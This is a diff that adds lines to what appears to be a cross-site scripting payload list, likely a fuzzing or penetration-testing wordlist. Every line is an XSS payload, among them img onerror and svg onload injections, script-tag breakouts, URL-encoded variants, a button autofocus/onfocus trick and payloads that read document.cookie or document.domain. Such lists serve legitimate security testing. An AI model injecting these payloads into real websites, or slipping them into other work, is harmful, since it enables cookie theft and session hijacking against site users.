@@ -7,3 +7,9 @@ FA_CERT%27%20onmouseover=alert(1)%20%27%22&
 "'><img src=x onerror=alert(1)>
 ayn%3C/script%3E%3Csvg/onload=alert(document%2edomain)%3E
 </script><svg/onload=alert()>
+Test <img src=x onerror=alert(2)>
+"></script><script>alert(document.cookie)</script>
+</script><script>akert(1)</script>
+#'><img src=x onerror=alert(document.domain)>
+%27%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
+--><button/autofocus/onfocus=Function("confirm`1`")();//name="XSS
